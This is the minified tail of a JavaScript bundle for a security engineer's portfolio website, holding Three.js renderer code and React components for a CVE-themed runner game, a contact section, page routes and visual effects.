X.copy(q).multiplyScalar(Pe).floor(),H.copy(O).multiplyScalar(Pe).floor(),I=ge;if(W!==0&&(G=b_),Se.bindFramebuffer(k.FRAMEBUFFER,G)&&Se.drawBuffers(E,G),Se.viewport(X),Se.scissor(H),Se.setScissorTest(I),F){const he=v.get(E.texture);k.framebufferTexture2D(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_CUBE_MAP_POSITIVE_X+U,he.__webglTexture,W)}else if(de){const he=U;for(let xe=0;xe<E.textures.length;xe++){const Ae=v.get(E.textures[xe]);k.framebufferTextureLayer(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0+xe,Ae.__webglTexture,W,he)}}else if(E!==null&&W!==0){const he=v.get(E.texture);k.framebufferTexture2D(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,he.__webglTexture,W)}Z=-1},this.readRenderTargetPixels=function(E,U,W,G,F,de,ve,he=0){if(!(E&&E.isWebGLRenderTarget)){Qe("WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");return}let xe=v.get(E).__webglFramebuffer;if(E.isWebGLCubeRenderTarget&&ve!==void 0&&(xe=xe[ve]),xe){Se.bindFramebuffer(k.FRAMEBUFFER,xe);try{const Ae=E.textures[he],Le=Ae.format,Ce=Ae.type;if(!at.textureFormatReadable(Le)){Qe("WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");return}if(!at.textureTypeReadable(Ce)){Qe("WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");return}U>=0&&U<=E.width-G&&W>=0&&W<=E.height-F&&(E.textures.length>1&&k.readBuffer(k.COLOR_ATTACHMENT0+he),k.readPixels(U,W,G,F,ae.convert(Le),ae.convert(Ce),de))}finally{const Ae=V!==null?v.get(V).__webglFramebuffer:null;Se.bindFramebuffer(k.FRAMEBUFFER,Ae)}}},this.readRenderTargetPixelsAsync=async function(E,U,W,G,F,de,ve,he=0){if(!(E&&E.isWebGLRenderTarget))throw new Error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");let xe=v.get(E).__webglFramebuffer;if(E.isWebGLCubeRenderTarget&&ve!==void 0&&(xe=xe[ve]),xe)if(U>=0&&U<=E.width-G&&W>=0&&W<=E.height-F){Se.bindFramebuffer(k.FRAMEBUFFER,xe);const Ae=E.textures[he],Le=Ae.format,Ce=Ae.type;if(!at.textureFormatReadable(Le))throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in RGBA or implementation defined format.");if(!at.textureTypeReadable(Ce))throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in UnsignedByteType or implementation defined type.");const He=k.createBuffer();k.bindBuffer(k.PIXEL_PACK_BUFFER,He),k.bufferData(k.PIXEL_PACK_BUFFER,de.byteLength,k.STREAM_READ),E.textures.length>1&&k.readBuffer(k.COLOR_ATTACHMENT0+he),k.readPixels(U,W,G,F,ae.convert(Le),ae.convert(Ce),0);const ot=V!==null?v.get(V).__webglFramebuffer:null;Se.bindFramebuffer(k.FRAMEBUFFER,ot);const St=k.fenceSync(k.SYNC_GPU_COMMANDS_COMPLETE,0);return k.flush(),await _w(k,St,4),k.bindBuffer(k.PIXEL_PACK_BUFFER,He),k.getBufferSubData(k.PIXEL_PACK_BUFFER,0,de),k.deleteBuffer(He),k.deleteSync(St),de}else throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: requested read bounds are out of range.")},this.copyFramebufferToTexture=function(E,U=null,W=0){const G=Math.pow(2,-W),F=Math.floor(E.image.width*G),de=Math.floor(E.image.height*G),ve=U!==null?U.x:0,he=U!==null?U.y:0;L.setTexture2D(E,0),k.copyTexSubImage2D(k.TEXTURE_2D,W,0,0,ve,he,F,de),Se.unbindTexture()};const w_=k.createFramebuffer(),M_=k.createFramebuffer();this.copyTextureToTexture=function(E,U,W=null,G=null,F=0,de=null){de===null&&(F!==0?(qa("WebGLRenderer: copyTextureToTexture function signature has changed to support src and dst mipmap levels."),de=F,F=0):de=0);let ve,he,xe,Ae,Le,Ce,He,ot,St;const bt=E.isCompressedTexture?E.mipmaps[de]:E.image;if(W!==null)ve=W.max.x-W.min.x,he=W.max.y-W.min.y,xe=W.isBox3?W.max.z-W.min.z:1,Ae=W.min.x,Le=W.min.y,Ce=W.isBox3?W.min.z:0;else{const Cn=Math.pow(2,-F);ve=Math.floor(bt.width*Cn),he=Math.floor(bt.height*Cn),E.isDataArrayTexture?xe=bt.depth:E.isData3DTexture?xe=Math.floor(bt.depth*Cn):xe=1,Ae=0,Le=0,Ce=0}G!==null?(He=G.x,ot=G.y,St=G.z):(He=0,ot=0,St=0);const lt=ae.convert(U.format),Re=ae.convert(U.type);let it;U.isData3DTexture?(L.setTexture3D(U,0),it=k.TEXTURE_3D):U.isDataArrayTexture||U.isCompressedArrayTexture?(L.setTexture2DArray(U,0),it=k.TEXTURE_2D_ARRAY):(L.setTexture2D(U,0),it=k.TEXTURE_2D),k.pixelStorei(k.UNPACK_FLIP_Y_WEBGL,U.flipY),k.pixelStorei(k.UNPACK_PREMULTIPLY_ALPHA_WEBGL,U.premultiplyAlpha),k.pixelStorei(k.UNPACK_ALIGNMENT,U.unpackAlignment);const Je=k.getParameter(k.UNPACK_ROW_LENGTH),gn=k.getParameter(k.UNPACK_IMAGE_HEIGHT),Ws=k.getParameter(k.UNPACK_SKIP_PIXELS),vn=k.getParameter(k.UNPACK_SKIP_ROWS),Xr=k.getParameter(k.UNPACK_SKIP_IMAGES);k.pixelStorei(k.UNPACK_ROW_LENGTH,bt.width),k.pixelStorei(k.UNPACK_IMAGE_HEIGHT,bt.height),k.pixelStorei(k.UNPACK_SKIP_PIXELS,Ae),k.pixelStorei(k.UNPACK_SKIP_ROWS,Le),k.pixelStorei(k.UNPACK_SKIP_IMAGES,Ce);const ut=E.isDataArrayTexture||E.isData3DTexture,an=U.isDataArrayTexture||U.isData3DTexture;if(E.isDepthTexture){const Cn=v.get(E),Qt=v.get(U),on=v.get(Cn.__renderTarget),pc=v.get(Qt.__renderTarget);Se.bindFramebuffer(k.READ_FRAMEBUFFER,on.__webglFramebuffer),Se.bindFramebuffer(k.DRAW_FRAMEBUFFER,pc.__webglFramebuffer);for(let ms=0;ms<xe;ms++)ut&&(k.framebufferTextureLayer(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,v.get(E).__webglTexture,F,Ce+ms),k.framebufferTextureLayer(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,v.get(U).__webglTexture,de,St+ms)),k.blitFramebuffer(Ae,Le,ve,he,He,ot,ve,he,k.DEPTH_BUFFER_BIT,k.NEAREST);Se.bindFramebuffer(k.READ_FRAMEBUFFER,null),Se.bindFramebuffer(k.DRAW_FRAMEBUFFER,null)}else if(F!==0||E.isRenderTargetTexture||v.has(E)){const Cn=v.get(E),Qt=v.get(U);Se.bindFramebuffer(k.READ_FRAMEBUFFER,w_),Se.bindFramebuffer(k.DRAW_FRAMEBUFFER,M_);for(let on=0;on<xe;on++)ut?k.framebufferTextureLayer(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,Cn.__webglTexture,F,Ce+on):k.framebufferTexture2D(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,Cn.__webglTexture,F),an?k.framebufferTextureLayer(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,Qt.__webglTexture,de,St+on):k.framebufferTexture2D(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,Qt.__webglTexture,de),F!==0?k.blitFramebuffer(Ae,Le,ve,he,He,ot,ve,he,k.COLOR_BUFFER_BIT,k.NEAREST):an?k.copyTexSubImage3D(it,de,He,ot,St+on,Ae,Le,ve,he):k.copyTexSubImage2D(it,de,He,ot,Ae,Le,ve,he);Se.bindFramebuffer(k.READ_FRAMEBUFFER,null),Se.bindFramebuffer(k.DRAW_FRAMEBUFFER,null)}else an?E.isDataTexture||E.isData3DTexture?k.texSubImage3D(it,de,He,ot,St,ve,he,xe,lt,Re,bt.data):U.isCompressedArrayTexture?k.compressedTexSubImage3D(it,de,He,ot,St,ve,he,xe,lt,bt.data):k.texSubImage3D(it,de,He,ot,St,ve,he,xe,lt,Re,bt):E.isDataTexture?k.texSubImage2D(k.TEXTURE_2D,de,He,ot,ve,he,lt,Re,bt.data):E.isCompressedTexture?k.compressedTexSubImage2D(k.TEXTURE_2D,de,He,ot,bt.width,bt.height,lt,bt.data):k.texSubImage2D(k.TEXTURE_2D,de,He,ot,ve,he,lt,Re,bt);k.pixelStorei(k.UNPACK_ROW_LENGTH,Je),k.pixelStorei(k.UNPACK_IMAGE_HEIGHT,gn),k.pixelStorei(k.UNPACK_SKIP_PIXELS,Ws),k.pixelStorei(k.UNPACK_SKIP_ROWS,vn),k.pixelStorei(k.UNPACK_SKIP_IMAGES,Xr),de===0&&U.generateMipmaps&&k.generateMipmap(it),Se.unbindTexture()},this.initRenderTarget=function(E){v.get(E).__webglFramebuffer===void 0&&L.setupRenderTarget(E)},this.initTexture=function(E){E.isCubeTexture?L.setTextureCube(E,0):E.isData3DTexture?L.setTexture3D(E,0):E.isDataArrayTexture||E.isCompressedArrayTexture?L.setTexture2DArray(E,0):L.setTexture2D(E,0),Se.unbindTexture()},this.resetState=function(){P=0,z=0,V=null,Se.reset(),me.reset()},typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}get coordinateSystem(){return ni}get outputColorSpace(){return this._outputColorSpace}set outputColorSpace(e){this._outputColorSpace=e;const n=this.getContext();n.drawingBufferColorSpace=Ye._getDrawingBufferColorSpace(e),n.unpackColorSpace=Ye._getUnpackColorSpace()}}const Vi=[-1.8,0,1.8],QA=(t,e,n)=>Math.min(n,Math.max(e,t)),eC=t=>{if(!t.length)return null;const e=Math.floor(Math.random()*t.length);return t[e]};function tC({entries:t=[]}){const e=ee.useRef(null),n=ee.useRef(null),i=ee.useRef({}),s=ee.useRef(null),[r,a]=ee.useState("idle"),[o,l]=ee.useState(0),[c,d]=ee.useState(0),[p,h]=ee.useState(""),[f,_]=ee.useState(()=>{if(typeof window>"u")return 0;const g=Number(window.localStorage.getItem("cveRunnerBest")||0);return Number.isFinite(g)?g:0}),y=ee.useRef(f);ee.useEffect(()=>{y.current=f},[f]),ee.useEffect(()=>{const g=e.current,x=n.current;if(!g||!x)return;const S=new g_({canvas:g,antialias:!0,alpha:!0,powerPreference:"high-performance"});S.setPixelRatio(Math.min(window.devicePixelRatio||1,2)),S.setClearColor(0,0);const T=new i_,A=new un(45,1,.1,100);A.position.set(0,4.2,8.4),A.lookAt(0,1,0);const R=new c_(16777215,.6),N=new l_(16777215,.65);N.position.set(3,6,4);const b=new o_(16737327,.4,14);b.position.set(-4,2,2),T.add(R,N,b);const w=new ar({color:new Ie("#f1f0ec"),roughness:.85,metalness:.05}),P=new Ot(new ao(18,120),w);P.rotation.x=-Math.PI/2,P.position.y=0,P.position.z=-40,T.add(P);const z=new iM(18,36,"#1d1d1d","#1d1d1d");z.position.y=.02,z.position.z=-40;const V=v=>{Array.isArray(z.material)?z.material.forEach(v):v(z.material)};V(v=>{v.transparent=!0,v.opacity=.2}),T.add(z);const Z=new ar({color:new Ie("#1d1d1d"),roughness:.4,metalness:.4}),$=new Ot(new wi(.2,.2,120),Z),X=new Ot(new wi(.2,.2,120),Z);$.position.set(-3,.1,-40),X.position.set(3,.1,-40),T.add($,X);const H=new ar({color:new Ie("#1d1d1d"),emissive:new Ie("#1d1d1d"),emissiveIntensity:.2,roughness:.35,metalness:.3}),I=new Ot(new wi(.9,1.2,.9),H);I.position.set(0,.6,0),T.add(I);const J=new ar({color:new Ie("#1d1d1d"),emissive:new Ie("#1d1d1d"),emissiveIntensity:.2,roughness:.4,metalness:.2}),K=new ar({color:new Ie("#ff642f"),emissive:new Ie("#ff642f"),emissiveIntensity:.6,roughness:.25,metalness:.4}),ne=new wi(.8,.8,.8),we=new $a(.35,.12,12,22),Pe=new ks,Ge=new ks;T.add(Pe,Ge);const Ke=()=>{const v=document.body.classList.contains("dark"),L=v?"#e5e4e0":"#1d1d1d",Y=v?"#252525":"#f1f0ec",Q=v?"#ff7b6b":"#ff642f";w.color.set(Y),V(j=>{j.color&&j.color.set(L),j.opacity=v?.35:.2}),Z.color.set(L),H.color.set(L),H.emissive.set(L),J.color.set(L),J.emissive.set(L),K.color.set(Q),K.emissive.set(Q),b.color.set(Q),R.intensity=v?.5:.6,N.intensity=v?.5:.65};Ke();const q=new MutationObserver(Ke);q.observe(document.body,{attributes:!0,attributeFilter:["class"]});const O={running:!1,speed:6,time:0,score:0,patched:0,laneIndex:1,targetX:Vi[1],playerVelocity:0,grounded:!0,obstacles:[],collectibles:[],obstacleTimer:0,collectibleTimer:0,obstacleInterval:.85,collectibleInterval:1.35,hudTimer:0},ge=v=>{for(;v.children.length;){const L=v.children[0];v.remove(L)}},Ue=()=>{O.running=!0,O.speed=6,O.time=0,O.score=0,O.patched=0,O.laneIndex=1,O.targetX=Vi[1],O.playerVelocity=0,O.grounded=!0,O.obstacles=[],O.collectibles=[],O.obstacleTimer=0,O.collectibleTimer=0,O.obstacleInterval=.85,O.collectibleInterval=1.35,O.hudTimer=0,I.position.set(0,.6,0),ge(Pe),ge(Ge),d(0),l(0),h(""),a("running")},ye=()=>{O.running=!1,a("over");const v=Math.floor(O.score);v>y.current&&(_(v),typeof window<"u"&&window.localStorage.setItem("cveRunnerBest",String(v))),s.current&&window.clearTimeout(s.current),h("Breach detected. Press Space to restart.")},Xe=()=>{const v=Math.floor(Math.random()*Vi.length),L=new Ot(ne,J);L.position.set(Vi[v],.4,-42),Pe.add(L),O.obstacles.push(L)},Tt=()=>{const v=Math.floor(Math.random()*Vi.length),L=new Ot(we,K);L.rotation.x=Math.PI/2,L.position.set(Vi[v],1.4,-42),L.userData.entry=eC(t),Ge.add(L),O.collectibles.push(L)},Ve=v=>{O.running&&(O.laneIndex=QA(O.laneIndex+v,0,Vi.length-1),O.targetX=Vi[O.laneIndex])},qe=()=>{!O.running||!O.grounded||(O.playerVelocity=7,O.grounded=!1)},tt=()=>{if(O.running){qe();return}Ue()};i.current={moveLeft:()=>Ve(-1),moveRight:()=>Ve(1),jump:qe,start:tt};const Oe=v=>{["ArrowLeft","ArrowRight","Space","ArrowUp"].includes(v.code)&&v.preventDefault(),v.code==="ArrowLeft"&&Ve(-1),v.code==="ArrowRight"&&Ve(1),v.code==="ArrowUp"&&qe(),v.code==="Space"&&tt()};window.addEventListener("keydown",Oe);const pt=()=>{const v=x.clientWidth||1,L=x.clientHeight||1;S.setSize(v,L,!1),A.aspect=v/L,A.updateProjectionMatrix()};let k=null;typeof ResizeObserver<"u"?(k=new ResizeObserver(pt),k.observe(x)):window.addEventListener("resize",pt),pt();const yt=v=>{s.current&&window.clearTimeout(s.current),v!=null&&v.id?h(`Patched ${v.id}`):h("Patch acquired."),s.current=window.setTimeout(()=>{h("")},1400)},Ze=v=>{O.hudTimer+=v,!(O.hudTimer<.12)&&(O.hudTimer=0,l(Math.floor(O.score)),d(O.patched))},at=new u_;let Se=0;const C=()=>{const v=Math.min(at.getDelta(),.032);O.running&&(O.time+=v,O.speed=Math.min(13,6+O.time*.2),O.score+=v*(8+O.speed),O.playerVelocity+=-18*v,I.position.y+=O.playerVelocity*v,I.position.y<=.6&&(I.position.y=.6,O.playerVelocity=0,O.grounded=!0),I.position.x+=(O.targetX-I.position.x)*.2,O.obstacleTimer+=v,O.obstacleTimer>=O.obstacleInterval&&(O.obstacleTimer=0,O.obstacleInterval=.7+Math.random()*.6,Xe()),O.collectibleTimer+=v,O.collectibleTimer>=O.collectibleInterval&&(O.collectibleTimer=0,O.collectibleInterval=1.1+Math.random()*.7,Tt()),O.obstacles=O.obstacles.filter(L=>{if(L.position.z+=O.speed*v,L.position.z>6)return Pe.remove(L),!1;const Y=Math.abs(L.position.z-I.position.z)<.55,Q=Math.abs(L.position.x-I.position.x)<.65,j=I.position.y<.95;return Y&&Q&&j?(ye(),!1):!0}),O.collectibles=O.collectibles.filter(L=>(L.position.z+=O.speed*v,L.rotation.y+=v*2,L.position.z>6?(Ge.remove(L),!1):L.position.distanceTo(I.position)<.8?(Ge.remove(L),O.score+=120,O.patched+=1,yt(L.userData.entry),!1):!0)),Ze(v)),S.render(T,A),Se=requestAnimationFrame(C)};return C(),()=>{cancelAnimationFrame(Se),window.removeEventListener("keydown",Oe),k?k.disconnect():window.removeEventListener("resize",pt),q.disconnect(),ne.dispose(),we.dispose(),z.geometry.dispose(),V(v=>v.dispose()),w.dispose(),Z.dispose(),H.dispose(),J.dispose(),K.dispose(),S.dispose()}},[t]),ee.useEffect(()=>()=>{s.current&&window.clearTimeout(s.current)},[]);const m=r==="idle"?"Press Space to Start":"Breach detected",u=r==="idle"?"Use arrow keys to change lanes. Space to jump.":"Press Space to restart.";return M.jsxs("div",{className:"cve-game",ref:n,children:[M.jsx("canvas",{ref:e,className:"cve-game__canvas"}),M.jsxs("div",{className:"cve-game__hud",children:[M.jsxs("div",{className:"game-card",children:[M.jsx("span",{className:"game-label",children:"Score"}),M.jsx("span",{className:"game-value",children:o})]}),M.jsxs("div",{className:"game-card",children:[M.jsx("span",{className:"game-label",children:"Patched"}),M.jsx("span",{className:"game-value",children:c})]}),M.jsxs("div",{className:"game-card",children:[M.jsx("span",{className:"game-label",children:"Best"}),M.jsx("span",{className:"game-value",children:f})]})]}),p&&M.jsx("div",{className:"game-toast",children:p}),M.jsx("div",{className:`game-overlay ${r==="running"?"":"show"}`,children:M.jsxs("div",{className:"game-overlay-card",children:[M.jsx("div",{className:"game-overlay-title",children:m}),M.jsx("div",{className:"game-overlay-text",children:u}),M.jsx("button",{className:"button primary",type:"button",onClick:()=>{var g,x;return(x=(g=i.current).start)==null?void 0:x.call(g)},children:r==="idle"?"Start run":"Restart"})]})}),M.jsxs("div",{className:"game-controls",children:[M.jsx("button",{className:"pill",type:"button",onClick:()=>{var g,x;return(x=(g=i.current).moveLeft)==null?void 0:x.call(g)},children:"←"}),M.jsx("button",{className:"pill",type:"button",onClick:()=>{var g,x;return(x=(g=i.current).jump)==null?void 0:x.call(g)},children:"Jump"}),M.jsx("button",{className:"pill",type:"button",onClick:()=>{var g,x;return(x=(g=i.current).moveRight)==null?void 0:x.call(g)},children:"→"})]})]})}function nC(){const t=ee.useMemo(()=>{const e=r=>r.toUpperCase().includes("CVE"),n=r=>{if(!r)return"Unknown";const o=new Date(r).getFullYear();return Number.isFinite(o)?String(o):"Unknown"},i=r=>{const o=((r||"").match(/\d/g)||[]).reduce((c,d)=>c+Number(d),0),l=["Low","Medium","High","Critical"];return l[o%l.length]},s=r=>r==="Critical"?9.4:r==="High"?8.1:r==="Medium"?6:4;return Ga.filter(r=>e(r.title)).map(r=>{const a=r.title.match(/CVE[-–](\d{4})[-–]?([\d]+)/i),o=a?`CVE-${a[1]}-${a[2]}`:r.slug.toUpperCase(),l=i(o);return{id:o,title:r.title,severity:l,cvss:s(l),year:n(r.date),kev:!1,summary:r.excerpt}})},[]);return M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container",children:[M.jsx("div",{className:"section-header",children:M.jsxs("div",{children:[M.jsx("div",{className:"eyebrow",children:"CVE map"}),M.jsx("h2",{className:"section-title",children:"CVE Runner"}),M.jsx("p",{className:"section-subtitle",children:"Patch the vulnerabilities. Dodge the breaches. Keep the system alive."})]})}),M.jsx("div",{className:"cve-game-shell",children:M.jsx(tC,{entries:t})})]})})}function iC(){const t="hemparekh1596@gmail.com",[e,n]=ee.useState(!1),i=()=>{navigator.clipboard&&navigator.clipboard.writeText(t).then(()=>{n(!0),setTimeout(()=>n(!1),1800)}).catch(()=>{})};return M.jsx("section",{className:"contact-strip",id:"contact",children:M.jsxs("div",{className:"container contact-grid",children:[M.jsxs("div",{children:[M.jsx("div",{className:"eyebrow",children:"Lets talk"}),M.jsx("h2",{className:"section-title",children:"Signal received. Lets build secure systems."}),M.jsx("p",{className:"contact-blurb",children:"Ready to collaborate on security engineering, privacy, or threat research? Drop a note and we will map the next move."}),e&&M.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),M.jsxs("div",{className:"contact-actions",children:[M.jsx("button",{className:"button primary",onClick:i,type:"button",children:"Copy Email"}),M.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),M.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function sC(){const[t,e]=ee.useState(0);return ee.useEffect(()=>{const n=()=>{const{scrollTop:i,scrollHeight:s,clientHeight:r}=document.documentElement,a=s>r?i/(s-r)*100:0;e(Math.min(100,Math.max(0,a)))};return n(),window.addEventListener("scroll",n,{passive:!0}),()=>window.removeEventListener("scroll",n)},[]),M.jsx("div",{className:"scroll-indicator","aria-hidden":"true",children:M.jsx("div",{className:"scroll-indicator__bar",style:{height:`${t}%`}})})}function rC(){const[t,e]=ee.useState(!1);return ee.useEffect(()=>{const n=()=>e(window.scrollY>400);return window.addEventListener("scroll",n,{passive:!0}),n(),()=>window.removeEventListener("scroll",n)},[]),t?M.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function aC(){const t=ee.useRef(null);return ee.useEffect(()=>{const e=t.current;if(!e)return()=>{};let n=0,i=0,s=null;const r=o=>{n=o.clientX,i=o.clientY},a=()=>{e.style.transform=`translate(${n}px, ${i}px) translate(-50%, -50%)`,s=requestAnimationFrame(a)};return window.addEventListener("mousemove",r),a(),()=>{window.removeEventListener("mousemove",r),s&&cancelAnimationFrame(s)}},[]),M.jsx("div",{className:"cursor-w","aria-hidden":"true",children:M.jsx("div",{ref:t,className:"cursor-dot"})})}const Km={light:{base:"#f1f0ec",hot:"#facb0e",warm:"#ff642f",cool:"#78bae6",accent:"#f06ba8"},dark:{base:"#1d1d1d",hot:"#facb0e",warm:"#ff642f",cool:"#78bae6",accent:"#f06ba8"}};function oC(){const t=ee.useRef(null);return ee.useEffect(()=>{const e=t.current;if(!e)return;const n=new g_({canvas:e,antialias:!0,alpha:!0,powerPreference:"high-performance"});n.setPixelRatio(Math.min(window.devicePixelRatio||1,2)),n.setClearColor(0,0);const i=new i_,s=new un(35,1,.1,100);s.position.set(0,0,7);const r=new ks;i.add(r);const a=document.createElement("canvas");a.width=512,a.height=512;const o=a.getContext("2d");if(!o){n.dispose();return}const l=new $w(a);l.wrapS=Wa,l.wrapT=Wa,l.center.set(.5,.5);const c=new ar({map:l,emissiveMap:l,emissive:new Ie("#ffffff"),emissiveIntensity:.6,metalness:.15,roughness:.3,transparent:!0,opacity:.95}),d=new Ot(new vh(2.1,128,128),c);r.add(d);const p=new mh({color:new Ie("#1d1d1d"),transparent:!0,opacity:.22}),h=new Ot(new $a(2.9,.02,16,180),p);h.rotation.set(Math.PI*.4,Math.PI*.15,0),r.add(h);const f=new Ot(new $a(3.25,.015,16,180),p.clone());f.rotation.set(Math.PI*.9,Math.PI*.2,.2),f.material.opacity=.14,r.add(f);const _=new c_(16777215,.65),y=new l_(16777215,.5);y.position.set(4,2,5);const m=new o_(16737327,.45,20);m.position.set(-6,1,6),i.add(_,y,m);const u=w=>{const P=a.width;o.clearRect(0,0,P,P),o.fillStyle=w.base,o.fillRect(0,0,P,P);const z=o.createRadialGradient(P*.28,P*.28,P*.1,P*.55,P*.55,P*.6);z.addColorStop(0,w.hot),z.addColorStop(.35,w.warm),z.addColorStop(.7,w.cool),z.addColorStop(1,"rgba(0,0,0,0)"),o.globalCompositeOperation="screen",o.fillStyle=z,o.fillRect(0,0,P,P);const V=o.createRadialGradient(P*.75,P*.2,P*.08,P*.7,P*.2,P*.45);V.addColorStop(0,w.accent),V.addColorStop(1,"rgba(0,0,0,0)"),o.fillStyle=V,o.fillRect(0,0,P,P),o.globalCompositeOperation="source-over",l.needsUpdate=!0},g=()=>{const w=document.body.classList.contains("dark");u(w?Km.dark:Km.light),c.emissiveIntensity=w?.45:.6,c.opacity=w?.88:.95,h.material.color.set(w?"#e5e4e0":"#1d1d1d"),h.material.opacity=w?.26:.22,f.material.color.set(w?"#e5e4e0":"#1d1d1d"),f.material.opacity=w?.18:.14,_.intensity=w?.45:.65,m.intensity=w?.35:.45};let x=2.1,S=1.2;const T=()=>{const w=window.innerWidth,P=window.innerHeight;n.setSize(w,P,!1),s.aspect=w/P,s.updateProjectionMatrix();const z=w/P>1.05,V=z?1:.82;r.scale.setScalar(V),x=z?2.1:1.3,S=z?1.2:.6,r.position.set(x,S,0)};T(),g();const A=new MutationObserver(g);A.observe(document.body,{attributes:!0,attributeFilter:["class"]}),window.addEventListener("resize",T);let R=0;const N=new u_,b=()=>{const w=N.getElapsedTime();d.rotation.y=w*.18,d.rotation.x=Math.sin(w*.2)*.08,h.rotation.z=w*.08,f.rotation.z=-w*.06,r.position.y=S+Math.sin(w*.3)*.08,l.rotation=Math.sin(w*.08)*.04,l.offset.set(Math.sin(w*.03)*.02,Math.cos(w*.04)*.02),n.render(i,s),R=requestAnimationFrame(b)};return b(),()=>{window.removeEventListener("resize",T),A.disconnect(),R&&cancelAnimationFrame(R),d.geometry.dispose(),c.dispose(),l.dispose(),h.geometry.dispose(),p.dispose(),f.geometry.dispose(),f.material.dispose(),n.dispose()}},[]),M.jsx("div",{className:"orb-field","aria-hidden":"true",children:M.jsx("canvas",{ref:t,className:"orb-canvas"})})}function lC(){const[t,e]=ee.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return ee.useEffect(()=>{const i=document.body;i.classList.remove("light","dark"),i.classList.add(t),localStorage.setItem("theme",t)},[t]),{theme:t,toggleTheme:()=>{e(i=>i==="light"?"dark":"light")}}}function cC(){const{theme:t,toggleTheme:e}=lC();return M.jsx(QS,{children:M.jsxs("div",{className:"app-shell",children:[M.jsx(oC,{}),M.jsx(aC,{}),M.jsx(sC,{}),M.jsx(ib,{onToggleTheme:e,theme:t}),M.jsx("main",{children:M.jsxs(XS,{children:[M.jsx(Hi,{path:"/",element:M.jsx(Yf,{})}),M.jsx(Hi,{path:"/blogs",element:M.jsx(_b,{})}),M.jsx(Hi,{path:"/projects",element:M.jsx(Ob,{})}),M.jsx(Hi,{path:"/certifications",element:M.jsx(Fb,{})}),M.jsx(Hi,{path:"/blog/:slug",element:M.jsx(Ub,{})}),M.jsx(Hi,{path:"/cve-map",element:M.jsx(nC,{})}),M.jsx(Hi,{path:"*",element:M.jsx(Yf,{})})]})}),M.jsx(iC,{}),M.jsx(ob,{}),M.jsx(rC,{})]})})}u0(document.getElementById("root")).render(M.jsx(og.StrictMode,{children:M.jsx(cC,{})}));
